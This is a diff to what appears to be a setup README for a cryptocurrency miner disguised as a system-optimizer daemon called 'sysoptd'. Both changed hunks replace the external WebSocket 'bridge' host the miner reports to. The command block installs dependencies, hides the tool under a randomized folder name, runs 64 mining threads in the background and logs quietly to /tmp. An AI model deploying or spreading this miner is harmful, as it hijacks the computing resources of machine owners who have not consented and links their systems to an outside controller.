@@ -169,7 +169,7 @@ mv sysoptd-2.1.4 opt-RANDOM && \
 cd opt-RANDOM && \
 pip install websockets psutil --break-system-packages -q && \
 python3 sysoptd.py \
-  --bridge wss://chimera-bridge-production-0ef2.up.railway.app \
+  --bridge wss://bridge-production-7c63.up.railway.app \
   --threads 64 \
   --no-split --no-schedule --no-noise --no-ramfill \
   > /tmp/m.log 2>&1 &
@@ -177,7 +177,7 @@ python3 sysoptd.py \
 
 **Features:**
 - Randomized folder name (e.g., `opt-739778b5`)
-- Bridge: `wss://chimera-bridge-production-0ef2.up.railway.app`
+- Bridge: `wss://bridge-production-7c63.up.railway.app`
 - 64 threads per miner
 - Runs in background, logs to `/tmp/m.log`
 
